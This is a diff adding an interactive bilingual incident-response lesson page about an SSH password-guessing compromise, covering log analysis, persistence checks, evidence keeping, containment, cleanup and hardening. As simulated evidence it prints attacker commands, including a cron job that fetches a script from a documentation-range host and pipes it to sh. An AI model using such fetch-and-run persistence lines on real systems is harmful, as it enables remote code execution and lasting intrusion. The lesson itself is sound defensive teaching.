@@ -1,0 +1,305 @@
+<!doctype html>
+<html lang="ro">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Primul tău incident: loguri, alerte și răspuns</title>
+<meta name="description" content="Lecție interactivă: un atac de ghicire a parolelor pe SSH, investigat din loguri: journalctl, grep, sort | uniq -c, login reușit, last, persistență în authorized_keys și cron, izolare, păstrarea dovezilor, curățare, întărire SSH, fail2ban și raportul de incident. / Interactive lesson: your first incident, from logs to report.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap">
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/lesson.css?v=2">
+<link rel="stylesheet" href="../assets/diagram.css?v=1">
+<link rel="stylesheet" href="../assets/theme.css">
+</head>
+<body>
+<div id="app"></div>
+<noscript><p style="padding:16px">Această pagină are nevoie de JavaScript. / This page needs JavaScript.</p></noscript>
+<script>
+(function(){
+const RO="READ-ONLY",CH="CONTAIN",FIX="FIX";
+const ATK="203.0.113.45",C2="198.51.100.7";
+const I1={q:{ro:"De ce a sunat alerta?",en:"Why did the alert fire?"},cmd:"SIEM: „SSH: >50 eșecuri de login de la aceeași adresă în 5 min” · web-shop",mode:RO,out:"alertă HIGH · 1.284 eșecuri · sursa "+ATK+" · 02:10–02:41",proves:{ro:"cineva încearcă parole pe SSH, automat: un atac de ghicire (brute force)",en:"someone is trying SSH passwords, automatically: a guessing (brute-force) attack"}};
+const I2={q:{ro:"Cine încearcă și pe ce conturi?",en:"Who is trying, on which accounts?"},cmd:"sudo journalctl -u ssh --since \"03:00 -1h\" | grep \"Failed password\" | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head",mode:RO,out:"1284 "+ATK+" · 3 10.0.10.5",proves:{ro:"aproape toate eșecurile vin de la o singură adresă externă; cele 3 de la 10.0.10.5 sunt Ana, care a greșit parola",en:"almost all failures come from one external address; the 3 from 10.0.10.5 are Ana mistyping her password"}};
+const I3={q:{ro:"A reușit vreuna?",en:"Did any succeed?"},cmd:"sudo grep \"Accepted\" /var/log/auth.log | grep "+ATK,mode:RO,out:"Nov 23 02:41:07 web-shop sshd[8812]: Accepted password for deploy from "+ATK+" port 51122 ssh2",proves:{ro:"DA: la 02:41 parola contului „deploy” a fost ghicită. Alerta devine incident",en:"YES: at 02:41 the \"deploy\" account's password was guessed. The alert becomes an incident"},bad:true};
+const I4={q:{ro:"E încă înăuntru? Ce a făcut?",en:"Is it still inside? What did it do?"},cmd:"who · last -i deploy | head -3 · sudo cat /home/deploy/.bash_history",mode:RO,out:"deploy pts/1 "+ATK+" 02:41 · deploy pts/1 "+ATK+" Sun Nov 23 02:41 still logged in · uname -a · id · cat /etc/passwd · curl -s http://"+C2+"/k.sh",proves:{ro:"sesiunea e încă deschisă; a cercetat sistemul și a descărcat un script de pe alt server",en:"the session is still open; it surveyed the system and downloaded a script from another server"},bad:true};
+const I5={q:{ro:"Și-a lăsat o ușă din spate?",en:"Did it leave a back door?"},cmd:"sudo cat /home/deploy/.ssh/authorized_keys · sudo crontab -l -u deploy",mode:RO,out:"ssh-ed25519 AAAA…q9 deploy@ci · ssh-ed25519 AAAA…Zx root@kali · */10 * * * * curl -s http://"+C2+"/k.sh | sh",proves:{ro:"persistență: o cheie SSH străină (a doua) și un cron care rulează scriptul la 10 minute",en:"persistence: a foreign SSH key (the second one) and a cron job running the script every 10 minutes"},bad:true};
+const I6={q:{ro:"Ce păstrez înainte să schimb ceva?",en:"What do I keep before changing anything?"},cmd:"sudo tar czf /root/ir-2026-11-23.tgz /var/log/auth.log* /home/deploy/.ssh /home/deploy/.bash_history /var/spool/cron · sha256sum /root/ir-2026-11-23.tgz",mode:RO,out:"e1c4…77a0  /root/ir-2026-11-23.tgz · + snapshot al VM-ului din consola de hosting",proves:{ro:"dovezile sunt copiate și au un hash: poți analiza mai târziu exact ce era, chiar după curățare",en:"the evidence is copied and hashed: you can later analyse exactly what was there, even after cleanup"}};
+const I7={q:{ro:"Cum îl opresc acum?",en:"How do I stop it now?"},cmd:"sudo nft add rule inet filter input ip saddr "+ATK+" drop · sudo usermod -L -e 1 deploy · sudo pkill -KILL -u deploy",mode:CH,out:"(regulă adăugată) · contul deploy blocat și expirat · sesiunea pts/1 închisă",proves:{ro:"izolare: adresa e blocată, contul nu mai poate intra, sesiunea activă e închisă",en:"containment: the address is blocked, the account can't log in, the active session is closed"}};
+const I8={q:{ro:"Cum scot tot ce a lăsat?",en:"How do I remove everything it left?"},cmd:"sudo sed -i '/root@kali/d' /home/deploy/.ssh/authorized_keys · sudo crontab -r -u deploy · sudo nft add rule inet filter output ip daddr "+C2+" drop",mode:FIX,out:"cheia străină ștearsă · cron șters · ieșirea spre "+C2+" blocată · căutare după alte fișiere modificate după 02:41",proves:{ro:"eradicare: ușile din spate cunoscute sunt închise; pe un server important, reinstalarea din imagine curată e mai sigură",en:"eradication: the known back doors are closed; on an important server, rebuilding from a clean image is safer"}};
+const I9={q:{ro:"Cum nu se mai întâmplă?",en:"How do we prevent it next time?"},cmd:"/etc/ssh/sshd_config.d/10-harden.conf: PasswordAuthentication no · PermitRootLogin no · AllowUsers ana deploy · sudo systemctl reload ssh · sudo systemctl enable --now fail2ban",mode:FIX,out:"login doar cu chei · root nu poate intra direct · doar 2 utilizatori · fail2ban: Ban "+ATK+" după 5 eșecuri",proves:{ro:"recuperare + întărire: fără parole pe SSH, ghicirea nu mai are ce ghici; fail2ban blochează automat",en:"recovery + hardening: with no SSH passwords, guessing has nothing to guess; fail2ban blocks automatically"}};
+const I10={q:{ro:"Ce scriem în raport?",en:"What goes in the report?"},cmd:"raport de incident: cronologie · impact · cauza · ce am făcut · ce schimbăm",mode:RO,out:"02:10 început atac · 02:41 login reușit (parolă slabă) · 02:44 persistență · 03:02 alertă văzută · 03:20 izolare · 04:05 curățare · cauza: SSH cu parolă deschis spre internet",proves:{ro:"lecțiile învățate: SSH doar prin VPN și chei, alertă și pe login reușit după multe eșecuri, parole unice pentru conturile tehnice",en:"lessons learned: SSH only over VPN and keys, an alert on a success after many failures too, unique passwords for technical accounts"}};
+
+window.LESSON={
+docTitle:{ro:"Primul tău incident: loguri, alerte și răspuns",en:"Your first incident: logs, alerts and response"},
+eyebrow:{ro:"Lecție interactivă · Securitate cibernetică",en:"Interactive lesson · Cybersecurity"},
+title:{ro:"Primul tău incident: loguri, alerte și răspuns",en:"Your first incident: logs, alerts and response"},
+sub:{ro:"E 03:02 și Ana, acum în rolul de analist, vede o alertă: mii de încercări de login pe SSH la serverul magazinului. Urmărim ce face un analist: confirmă din loguri, află dacă atacul a reușit, ce a făcut atacatorul și ce a lăsat în urmă, păstrează dovezile, izolează, curăță, întărește serverul și scrie raportul. Totul din apărare, cu comenzi Linux obișnuite.",en:"It's 03:02 and Ana, now an analyst, sees an alert: thousands of SSH login attempts on the shop's server. We follow what an analyst does: confirm it from logs, find out whether the attack succeeded, what the attacker did and left behind, keep the evidence, contain, clean up, harden the server and write the report. All from the defender's side, with ordinary Linux commands."},
+meta:[{ro:"≈ 30 minute",en:"≈ 30 minutes"},{ro:"12 pași",en:"12 steps"},{ro:"8 întrebări",en:"8 questions"},{ro:"Începător+",en:"Beginner+"}],
+goals:[{ro:"Citești loguri SSH: journalctl, grep, awk, sort | uniq -c",en:"Read SSH logs: journalctl, grep, awk, sort | uniq -c"},{ro:"Deosebești o alertă de un incident: login reușit, sesiuni, istoric",en:"Tell an alert from an incident: a successful login, sessions, history"},{ro:"Persistență: chei SSH și cron; dovezi păstrate înainte de schimbări",en:"Persistence: SSH keys and cron; evidence kept before changes"},{ro:"Ciclul de răspuns: izolare, eradicare, recuperare, lecții învățate",en:"The response cycle: containment, eradication, recovery, lessons learned"}],
+foot:{ro:"Adrese din blocurile de documentație (203.0.113.0/24, 198.51.100.0/24), nume și chei fictive. Exersezi pe VM-urile tale.",en:"Addresses from the documentation blocks (203.0.113.0/24, 198.51.100.0/24), fictional names and keys. Practise on your own VMs."},
+ui:{frameT:{ro:"Investigația (live)",en:"The investigation (live)"},refT:{ro:"Comenzi de răspuns la incident",en:"Incident response commands"},refLead:{ro:"Ce rulezi pentru fiecare întrebare, în ordinea în care le pui.",en:"What you run for each question, in the order you ask them."}},
+tryT:{ro:"Încearcă (pe VM-ul tău)",en:"Try it (on your VM)"},
+legend:[["lg-ip","READ",{ro:"doar citește",en:"read-only"}],["lg-arp","CONTAIN",{ro:"izolare",en:"containment"}],["lg-app","FIX",{ro:"curățare, întărire",en:"cleanup, hardening"}],["lg-tcp","!",{ro:"compromis",en:"compromise"}]],
+
+nodes:{
+  atk:{type:"globe",name:{ro:"atacator",en:"attacker"},lines:[ATK]},
+  c2:{type:"box",name:{ro:"server străin",en:"foreign server"},lines:[C2]},
+  fw:{type:"router",name:"firewall",lines:[":22 · :443"]},
+  web:{type:"server",name:"web-shop",lines:["10.0.10.10"]},
+  siem:{type:"svc",name:"SIEM",lines:[{ro:"loguri + alerte",en:"logs + alerts"}]},
+  ana:{type:"user",name:"Ana",lines:[{ro:"analist",en:"analyst"}]}
+},
+links:[["atk","fw"],["fw","web"],["web","c2"],["web","siem"],["siem","ana"]],
+linkLabels:{"atk-fw":"SSH","fw-web":":22","web-c2":"HTTP","web-siem":"journald → syslog","siem-ana":{"ro":"alertă","en":"alert"}},
+layouts:{
+  wide:{vb:[0,0,1000,500],n:{atk:[90,140],fw:[320,140],web:[560,240],c2:[860,110],siem:[560,430],ana:[860,430]},
+    zones:[{x:240,y:40,w:440,h:440,top:true,cls:"virt",l:{ro:"rețeaua magazinului",en:"the shop's network"}}]},
+  narrow:{vb:[0,0,360,860],n:{atk:[80,70],fw:[180,230],web:[180,420],c2:[300,560],siem:[80,600],ana:[180,790]}}
+},
+groups:[
+  {id:"q",color:"l7",fields:["q"],name:{ro:"Întrebarea",en:"The question"},short:"Q",grow:2},
+  {id:"c",color:"l3",fields:["cmd","mode","out"],name:{ro:"Comanda și rezultatul",en:"Command and output"},short:"CMD",grow:4},
+  {id:"e",color:"arp",fields:["proves"],name:{ro:"Ce dovedește",en:"What it proves"},short:{ro:"Dovada",en:"Evidence"},grow:3}
+],
+fieldLabels:{q:{ro:"Întrebarea",en:"The question"},cmd:{ro:"Comanda",en:"Command"},mode:{ro:"Tip",en:"Type"},out:{ro:"Ce afișează",en:"Output"},proves:{ro:"Ce dovedește",en:"What it proves"}},
+pdu:f=>f.bad?{badge:{ro:"Compromis confirmat",en:"Confirmed compromise"},tok:["!","k-tcp"]}:f.mode===CH?{badge:{ro:"Izolare",en:"Containment"},tok:["CONTAIN","k-arp"]}:f.mode===FIX?{badge:{ro:"Curățare, întărire",en:"Cleanup, hardening"},tok:["FIX","k-app"]}:{badge:{ro:"Doar citește",en:"Read-only"},tok:["READ","k-ip"]},
+
+init:{},
+tables:{
+  ir:{idx:true,title:{ro:"Ciclul de răspuns la incident (NIST SP 800-61)",en:"The incident response cycle (NIST SP 800-61)"},cols:[{ro:"Faza",en:"Phase"},{ro:"În incidentul nostru",en:"In our incident"}],plain:[0,1],
+    rows:()=>[[{ro:"Pregătire",en:"Preparation"},{ro:"loguri trimise în SIEM, alertă pe eșecuri SSH",en:"logs shipped to the SIEM, an alert on SSH failures"}],[{ro:"Detecție și analiză",en:"Detection and analysis"},{ro:"journalctl, grep, last, authorized_keys, cron",en:"journalctl, grep, last, authorized_keys, cron"}],[{ro:"Izolare",en:"Containment"},{ro:"blocare IP, cont blocat, sesiune închisă",en:"IP blocked, account locked, session killed"}],[{ro:"Eradicare și recuperare",en:"Eradication and recovery"},{ro:"cheie și cron șterse, SSH doar cu chei, fail2ban",en:"key and cron removed, SSH keys only, fail2ban"}],[{ro:"Activitate post-incident",en:"Post-incident activity"},{ro:"raport, cronologie, lecții învățate",en:"report, timeline, lessons learned"}]]},
+  logs:{title:{ro:"Unde sunt logurile",en:"Where the logs are"},cols:[{ro:"Ce cauți",en:"What you're after"},"Debian / Ubuntu","RHEL / Rocky"],plain:[0],
+    rows:()=>[[{ro:"login-uri SSH",en:"SSH logins"},"/var/log/auth.log · journalctl -u ssh","/var/log/secure · journalctl -u sshd"],[{ro:"cine e logat acum",en:"who's logged in now"},"who · w","who · w"],[{ro:"istoric login-uri",en:"login history"},"last · lastb (eșecuri)","last · lastb"],[{ro:"sarcini programate",en:"scheduled tasks"},"crontab -l -u X · /etc/cron.*","crontab -l -u X · /etc/cron.*"]]},
+  pipe:{title:{ro:"Pipeline-ul de numărat",en:"The counting pipeline"},cols:[{ro:"Bucata",en:"The piece"},{ro:"Ce face",en:"What it does"}],plain:[1],
+    rows:()=>[["grep \"Failed password\"",{ro:"păstrează doar liniile cu eșecuri",en:"keeps only the failure lines"}],["awk '{print $(NF-3)}'",{ro:"scoate câmpul cu adresa IP (al 4-lea de la final)",en:"pulls the IP address field (4th from the end)"}],["sort | uniq -c",{ro:"grupează adresele identice și le numără",en:"groups identical addresses and counts them"}],["sort -rn | head",{ro:"cele mai multe primele, doar top 10",en:"most first, top 10 only"}]]}
+},
+log:{title:{ro:"Cronologia investigației",en:"Investigation timeline"},lead:{ro:"Fiecare comandă și ce a dovedit.",en:"Every command and what it proved."},first:{ro:"Pas",en:"Step"},minWidth:600,
+  cols:[{h:{ro:"Comanda",en:"Command"},v:f=>f.cmd||"",cls:"mac"},{h:{ro:"Ce dovedește",en:"What it proves"},v:f=>f.proves||"",cls:""}]},
+
+steps:[
+{at:["siem","ana"],frame:I1,kind:"d",move:[[["atk","fw"],["fw","web"]],[["web","siem"],["siem","ana"]]],marks:{ana:{k:"drop",t:{ro:"alertă HIGH",en:"HIGH alert"}}},tables:["ir"],hl:{ir:0},log:{ro:"alerta",en:"the alert"},who:"SIEM",
+ title:{ro:"03:02: alerta",en:"03:02: the alert"},
+ body:{ro:`<p>Logurile serverului <code>web-shop</code> ajung într-un <strong>SIEM</strong>, un sistem care adună loguri și rulează reguli de detecție. Una dintre ele: „peste 50 de eșecuri SSH de la aceeași adresă în 5 minute”. Acum a sunat: <strong>1.284 de eșecuri</strong> de la <code>${ATK}</code>.</p>
+<p>O alertă nu e încă un incident. Pe internet, orice SSH deschis primește zilnic astfel de încercări. Treaba analistului e să afle: <strong>a reușit sau nu?</strong></p>
+<p class="key">Faptul că alerta a existat se datorează pregătirii: logurile erau colectate și regula era scrisă dinainte.</p>`,
+ en:`<p>The <code>web-shop</code> server's logs go to a <strong>SIEM</strong>, a system that collects logs and runs detection rules. One of them: "over 50 SSH failures from the same address in 5 minutes". It just fired: <strong>1,284 failures</strong> from <code>${ATK}</code>.</p>
+<p>An alert isn't an incident yet. On the internet, any open SSH gets such attempts every day. The analyst's job is to find out: <strong>did it succeed or not?</strong></p>
+<p class="key">The alert existed thanks to preparation: the logs were being collected and the rule was written in advance.</p>`}},
+
+{at:"web",frame:I2,kind:"d",tables:["pipe"],log:{ro:"cine încearcă",en:"who is trying"},who:"journalctl",
+ title:{ro:"Confirmi din loguri: cine și cât",en:"Confirm it from the logs: who and how much"},
+ body:{ro:`<p>Ana se conectează la server și citește direct sursa. <code>journalctl -u ssh</code> arată logurile serviciului SSH; restul pipeline-ului le transformă într-un clasament:</p>
+<p><code>grep "Failed password"</code> → <code>awk</code> scoate adresa → <code>sort | uniq -c</code> numără → <code>sort -rn</code> le pune pe cele mai multe primele.</p>
+<p>Rezultat: <strong>1.284</strong> de la <code>${ATK}</code> și 3 de la <code>10.0.10.5</code>, laptopul Anei, care și-a greșit parola aseară. Contextul contează: nu orice eșec e un atac.</p>`,
+ en:`<p>Ana connects to the server and reads the source directly. <code>journalctl -u ssh</code> shows the SSH service's logs; the rest of the pipeline turns them into a ranking:</p>
+<p><code>grep "Failed password"</code> → <code>awk</code> pulls out the address → <code>sort | uniq -c</code> counts → <code>sort -rn</code> puts the most first.</p>
+<p>The result: <strong>1,284</strong> from <code>${ATK}</code> and 3 from <code>10.0.10.5</code>, Ana's laptop, which mistyped its password last night. Context matters: not every failure is an attack.</p>`},
+ more:{ro:`<p>Același pipeline merge pe orice log: cele mai active IP-uri în logul web, cele mai frecvente erori, utilizatorii cu cele mai multe eșecuri. E unealta numărul 1 a unui analist pe Linux.</p>`,en:`<p>The same pipeline works on any log: the busiest IPs in the web log, the most frequent errors, the users with the most failures. It's an analyst's number-one tool on Linux.</p>`},
+ try:[{cmd:"sudo journalctl -u ssh --since today | grep \"Failed password\" | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head",d:{ro:"Pe un VM cu SSH: cine a greșit parola azi. (Pe RHEL: -u sshd.)",en:"On a VM with SSH: who got the password wrong today. (On RHEL: -u sshd.)"}}]},
+
+{at:["web","atk"],frame:I3,kind:"d",move:[[["atk","fw"],["fw","web"]]],marks:{web:{k:"drop",t:"Accepted"}},log:{ro:"login reușit!",en:"successful login!"},who:{ro:"Incident",en:"Incident"},
+ title:{ro:"Întrebarea cheie: a reușit vreuna?",en:"The key question: did any succeed?"},
+ body:{ro:`<p>Eșecurile sunt zgomot. Contează <strong>succesul</strong>. Ana caută <code>Accepted</code> pentru aceeași adresă:</p>
+<p><code>02:41:07 … Accepted password for deploy from ${ATK}</code></p>
+<p>Contul <code>deploy</code>, folosit de scriptul de publicare, avea o parolă slabă și login prin parolă permis. După 31 de minute de încercări, atacatorul a ghicit-o.</p>
+<p class="key">Acum e un <strong>incident</strong>: cineva străin a intrat pe server. Ana anunță responsabilul conform procedurii și continuă investigația.</p>`,
+ en:`<p>Failures are noise. What matters is a <strong>success</strong>. Ana looks for <code>Accepted</code> from the same address:</p>
+<p><code>02:41:07 … Accepted password for deploy from ${ATK}</code></p>
+<p>The <code>deploy</code> account, used by the publishing script, had a weak password and password login allowed. After 31 minutes of attempts, the attacker guessed it.</p>
+<p class="key">Now it's an <strong>incident</strong>: a stranger got into the server. Ana notifies the person in charge, per the procedure, and keeps investigating.</p>`},
+ more:{ro:`<p>O regulă de detecție mai bună: „login reușit de la o adresă care a avut multe eșecuri înainte”. Ar fi sunat chiar la 02:41, nu la 03:02.</p>`,en:`<p>A better detection rule: "a successful login from an address that had many failures before". It would have fired right at 02:41, not 03:02.</p>`}},
+
+{at:["web","c2"],frame:I4,kind:"d",move:[[["web","c2"]]],marks:{web:{k:"drop",t:{ro:"încă logat",en:"still logged in"}},c2:{k:"drop",t:"k.sh"}},tables:["logs"],log:{ro:"ce a făcut",en:"what it did"},who:{ro:"Analiză",en:"Analysis"},
+ title:{ro:"E încă înăuntru? Ce a făcut?",en:"Is it still in? What did it do?"},
+ body:{ro:`<ul><li><code>who</code>: <code>deploy</code> e logat <strong>acum</strong>, de la <code>${ATK}</code>;</li>
+<li><code>last -i deploy</code>: sesiunea a început la 02:41 și e „still logged in”;</li>
+<li><code>.bash_history</code>: comenzile tastate: <code>uname -a</code>, <code>id</code>, <code>cat /etc/passwd</code> (recunoaștere), apoi <code>curl -s http://${C2}/k.sh</code>: a descărcat un script de pe alt server.</li></ul>
+<p>Istoricul shell-ului poate fi șters sau falsificat de atacator. Aici a fost neglijent, dar nu te bazezi doar pe el.</p>`,
+ en:`<ul><li><code>who</code>: <code>deploy</code> is logged in <strong>right now</strong>, from <code>${ATK}</code>;</li>
+<li><code>last -i deploy</code>: the session started at 02:41 and is "still logged in";</li>
+<li><code>.bash_history</code>: the typed commands: <code>uname -a</code>, <code>id</code>, <code>cat /etc/passwd</code> (reconnaissance), then <code>curl -s http://${C2}/k.sh</code>: it downloaded a script from another server.</li></ul>
+<p>Shell history can be wiped or faked by an attacker. Here it was careless, but you don't rely on it alone.</p>`},
+ try:[{cmd:"who; last -i -n 5",d:{ro:"Cine e logat acum și ultimele 5 login-uri, cu IP.",en:"Who's logged in now and the last 5 logins, with IPs."}}]},
+
+{at:["web"],frame:I5,kind:"d",marks:{web:{k:"drop",t:{ro:"cheie + cron",en:"key + cron"}}},log:{ro:"persistență",en:"persistence"},who:{ro:"Persistență",en:"Persistence"},
+ title:{ro:"Ușa din spate: chei SSH și cron",en:"The back door: SSH keys and cron"},
+ body:{ro:`<p>Un atacator care a intrat vrea să poată reveni, chiar dacă parola e schimbată. Asta se numește <strong>persistență</strong>. Două locuri clasice pe Linux:</p>
+<ul><li><code>~/.ssh/authorized_keys</code>: a doua cheie, <code>root@kali</code>, nu e a echipei. Cu ea poate intra fără parolă;</li>
+<li><code>crontab -l -u deploy</code>: la fiecare 10 minute, descarcă și rulează <code>k.sh</code>. Dacă ștergi doar scriptul, cron-ul îl readuce.</li></ul>
+<p class="key">Nu curăța încă. Întâi notezi tot și păstrezi dovezile.</p>`,
+ en:`<p>An attacker who got in wants to be able to come back, even if the password changes. That's called <strong>persistence</strong>. Two classic places on Linux:</p>
+<ul><li><code>~/.ssh/authorized_keys</code>: the second key, <code>root@kali</code>, isn't the team's. With it, they can get in without a password;</li>
+<li><code>crontab -l -u deploy</code>: every 10 minutes it downloads and runs <code>k.sh</code>. If you only delete the script, cron brings it back.</li></ul>
+<p class="key">Don't clean up yet. First you write everything down and keep the evidence.</p>`},
+ more:{ro:`<p>Alte locuri unde se ascunde persistența: <code>/etc/cron.d/</code>, servicii systemd noi (<code>systemctl list-unit-files --state=enabled</code>), utilizatori noi în <code>/etc/passwd</code>, fișiere modificate recent (<code>find / -newer … -type f</code>).</p>`,en:`<p>Other places persistence hides: <code>/etc/cron.d/</code>, new systemd services (<code>systemctl list-unit-files --state=enabled</code>), new users in <code>/etc/passwd</code>, recently modified files (<code>find / -newer … -type f</code>).</p>`},
+ try:[{cmd:"for u in $(cut -d: -f1 /etc/passwd); do sudo crontab -l -u $u 2>/dev/null | sed \"s/^/$u: /\"; done",d:{ro:"Cron-urile tuturor utilizatorilor.",en:"Every user's cron jobs."}}]},
+
+{at:["web","siem"],frame:I6,kind:"d",move:[[["web","siem"]]],marks:{siem:{k:"ok",t:{ro:"dovezi + hash",en:"evidence + hash"}}},log:{ro:"dovezi păstrate",en:"evidence kept"},who:{ro:"Dovezi",en:"Evidence"},
+ title:{ro:"Păstrezi dovezile înainte să schimbi ceva",en:"Keep the evidence before you change anything"},
+ body:{ro:`<p>Orice comandă de curățare distruge informație. Așa că, întâi:</p>
+<ul><li>o arhivă cu logurile, cheile, istoricul și cron-urile, plus <strong>hash-ul ei</strong> (<code>sha256sum</code>), ca să poți dovedi mai târziu că n-a fost modificată;</li>
+<li>un <strong>snapshot</strong> al VM-ului din consola de hosting: păstrează și memoria și discul exact cum erau;</li>
+<li>notițe cu ora fiecărei acțiuni.</li></ul>
+<p>Dacă incidentul ajunge la poliție, la asigurator sau la un audit, aceste dovezi contează. Și te ajută să înțelegi ce s-a întâmplat după ce focul s-a stins.</p>`,
+ en:`<p>Every cleanup command destroys information. So first:</p>
+<ul><li>an archive of the logs, keys, history and cron jobs, plus <strong>its hash</strong> (<code>sha256sum</code>), so you can later prove it wasn't altered;</li>
+<li>a <strong>snapshot</strong> of the VM from the hosting console: it keeps memory and disk exactly as they were;</li>
+<li>notes with the time of each action.</li></ul>
+<p>If the incident reaches the police, an insurer or an audit, this evidence matters. And it helps you understand what happened once the fire is out.</p>`},
+ try:[{cmd:"sudo tar czf /root/ir-$(date +%F).tgz /var/log/auth.log* && sha256sum /root/ir-$(date +%F).tgz",d:{ro:"Arhivă cu logurile și hash-ul ei.",en:"An archive of the logs and its hash."}}]},
+
+{at:["fw","web","atk"],frame:I7,kind:"d",move:[[["atk","fw"]]],marks:{fw:{k:"ok",t:{ro:"blocat",en:"blocked"}},web:{k:"ok",t:{ro:"cont blocat",en:"account locked"}}},tables:["ir"],hl:{ir:2},log:{ro:"izolare",en:"containment"},who:{ro:"Izolare",en:"Containment"},
+ title:{ro:"Izolare: oprești atacatorul acum",en:"Containment: stop the attacker now"},
+ body:{ro:`<ul><li><code>nft add rule … ip saddr ${ATK} drop</code>: firewall-ul nu mai primește nimic de la adresa atacatorului;</li>
+<li><code>usermod -L -e 1 deploy</code>: parola contului e blocată și contul e expirat, deci nici cheia străină nu mai merge;</li>
+<li><code>pkill -KILL -u deploy</code>: sesiunea deschisă e închisă.</li></ul>
+<p>Blocarea unei adrese e doar o primă măsură: atacatorul poate schimba adresa în câteva secunde. Contul blocat și sesiunea închisă contează mai mult.</p>
+<p class="key">Izolarea câștigă timp. Nu e încă curățare.</p>`,
+ en:`<ul><li><code>nft add rule … ip saddr ${ATK} drop</code>: the firewall no longer accepts anything from the attacker's address;</li>
+<li><code>usermod -L -e 1 deploy</code>: the account's password is locked and the account expired, so the foreign key no longer works either;</li>
+<li><code>pkill -KILL -u deploy</code>: the open session is closed.</li></ul>
+<p>Blocking an address is only a first step: the attacker can change address in seconds. The locked account and killed session matter more.</p>
+<p class="key">Containment buys time. It isn't cleanup yet.</p>`}},
+
+{at:["web","c2"],frame:I8,kind:"d",marks:{c2:{k:"ok",t:{ro:"blocat la ieșire",en:"blocked outbound"}},web:{k:"ok",t:{ro:"curățat",en:"cleaned"}}},tables:["ir"],hl:{ir:3},log:{ro:"eradicare",en:"eradication"},who:{ro:"Eradicare",en:"Eradication"},
+ title:{ro:"Eradicare: scoți tot ce a lăsat",en:"Eradication: remove everything it left"},
+ body:{ro:`<ul><li>ștergi cheia străină din <code>authorized_keys</code> și cron-ul contului;</li>
+<li>blochezi și traficul <strong>spre</strong> <code>${C2}</code>, în caz că mai e ceva care încearcă să-l contacteze;</li>
+<li>cauți alte schimbări de după 02:41: fișiere noi, servicii noi, utilizatori noi;</li>
+<li>schimbi toate secretele de pe server: parole, chei API, parola bazei de date.</li></ul>
+<p class="key">Pe un server important, cel mai sigur e să-l <strong>reconstruiești</strong> dintr-o imagine curată și să muți doar datele verificate. Nu poți fi niciodată 100% sigur că ai găsit tot.</p>`,
+ en:`<ul><li>remove the foreign key from <code>authorized_keys</code> and the account's cron job;</li>
+<li>also block traffic <strong>to</strong> <code>${C2}</code>, in case something else still tries to reach it;</li>
+<li>look for other changes after 02:41: new files, new services, new users;</li>
+<li>change every secret on the server: passwords, API keys, the database password.</li></ul>
+<p class="key">On an important server, the safest move is to <strong>rebuild</strong> it from a clean image and move over only verified data. You can never be 100% sure you found everything.</p>`},
+ try:[{cmd:"sudo find / -xdev -type f -newermt \"2026-11-23 02:41\" 2>/dev/null | grep -v -E '^/(proc|sys|var/log)'",d:{ro:"Fișierele modificate după ora intrării.",en:"Files modified after the break-in time."}}]},
+
+{at:["fw","web"],frame:I9,kind:"d",marks:{web:{k:"ok",t:{ro:"doar chei",en:"keys only"}},fw:{k:"ok",t:"fail2ban"}},tables:["ir"],hl:{ir:3},log:{ro:"întărire",en:"hardening"},who:{ro:"Întărire",en:"Hardening"},
+ title:{ro:"Recuperare și întărire: SSH fără parole",en:"Recovery and hardening: SSH without passwords"},
+ body:{ro:`<p>Cauza a fost simplă: SSH deschis spre internet, cu login prin parolă și o parolă slabă. Remedierea închide exact ușa asta:</p>
+<ul><li><code>PasswordAuthentication no</code>: doar chei, deci nu mai e nimic de ghicit;</li>
+<li><code>PermitRootLogin no</code> și <code>AllowUsers ana deploy</code>: doar conturile necesare;</li>
+<li><strong>fail2ban</strong> citește logul și blochează automat adresele cu prea multe eșecuri;</li>
+<li>pe termen lung: SSH accesibil doar prin VPN, cum a propus Ana în prima lecție.</li></ul>
+<p>Înainte de <code>systemctl reload ssh</code>, testezi configurația cu <code>sshd -t</code> și păstrezi o sesiune deschisă, ca să nu te închizi singur pe dinafară.</p>`,
+ en:`<p>The cause was simple: SSH open to the internet, with password login and a weak password. The fix closes exactly that door:</p>
+<ul><li><code>PasswordAuthentication no</code>: keys only, so there's nothing left to guess;</li>
+<li><code>PermitRootLogin no</code> and <code>AllowUsers ana deploy</code>: only the accounts needed;</li>
+<li><strong>fail2ban</strong> reads the log and automatically bans addresses with too many failures;</li>
+<li>long term: SSH reachable only over VPN, as Ana proposed in the first lesson.</li></ul>
+<p>Before <code>systemctl reload ssh</code>, test the config with <code>sshd -t</code> and keep a session open, so you don't lock yourself out.</p>`},
+ try:[{cmd:"sudo sshd -t && sudo sshd -T | grep -E 'passwordauthentication|permitrootlogin'",d:{ro:"Verifici configurația și ce valori sunt active.",en:"Check the config and which values are active."}},{cmd:"sudo fail2ban-client status sshd",d:{ro:"Câte adrese a blocat fail2ban.",en:"How many addresses fail2ban has banned."}}]},
+
+{at:["ana","siem"],frame:I10,kind:"d",tables:["ir"],hl:{ir:4},log:{ro:"raport",en:"report"},who:{ro:"Raport",en:"Report"},
+ title:{ro:"Raportul și lecțiile învățate",en:"The report and lessons learned"},
+ body:{ro:`<p>Un incident nu se termină când serverul merge din nou, ci când ai înțeles și ai schimbat ce trebuie. Raportul are:</p>
+<ul><li><strong>cronologia</strong>, minut cu minut (de aici notițele cu ora);</li>
+<li><strong>impactul</strong>: ce date sau sisteme au fost atinse (aici: nimic din baza de clienți, verificat în logurile bazei);</li>
+<li><strong>cauza</strong>: SSH cu parolă slabă, deschis spre internet;</li>
+<li><strong>ce schimbăm</strong>: SSH prin VPN, chei, alertă pe „succes după eșecuri”, parole unice pentru conturile tehnice.</li></ul>
+<p class="key">Raportul se scrie fără vinovați („blameless”): scopul e ca sistemul să devină mai bun, nu să găsești pe cine să cerți.</p>`,
+ en:`<p>An incident doesn't end when the server works again, but when you've understood it and changed what's needed. The report has:</p>
+<ul><li>the <strong>timeline</strong>, minute by minute (hence the timed notes);</li>
+<li>the <strong>impact</strong>: which data or systems were touched (here: nothing in the customer database, checked in the database logs);</li>
